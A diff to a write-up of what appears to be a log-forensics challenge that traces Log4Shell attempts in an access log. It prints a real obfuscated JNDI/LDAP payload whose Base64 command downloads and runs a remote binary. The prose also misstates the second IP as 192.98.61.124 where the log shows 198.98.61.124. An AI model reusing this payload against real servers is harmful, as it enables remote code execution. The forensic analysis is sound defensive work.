@@ -107,9 +107,16 @@ Yet again, grep comes in handy. A simple `grep jndi acess.log` reutrns a single 
 ```
 
 Now we have the first IP that tried to exploit Log4Shell- `98.0.242.10`. Finding the second one was a bit harder. I looked through a few YouTube videos to try to figure out if there was another way to exploit it. I wasn't able to find any other way. Eventually, I realized that they must've found a way to obfuscate the exploit. A quick Google search turned up the obfuscated exploit code
+
 ![obfuscated](./obfuscatedLog4j.png)
 
+After finding that, all it took was another quick `grep Base64 access.log` to find the second ip, `192.98.61.124`
+```
+198.98.61.124 - - [09/Feb/2022:20:24:19 +0000] "GET / HTTP/1.1" 200 820 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')"
+```
+
 #### Real World Application
+This challenge taught me how to track down attempted known exploits. Log4j is a serious threat that emerged recently, so learning the skills of how to find the IP of an attacker trying to exploit it gives us a target to look into for the remainder of the forensic investigation. Furthermore, finding the second IP required me to learn about how known exploits could be hidden from analysts by simple obfuscation techniques, and consequently, how to detect obfuscated exploits.
 
 ---
 
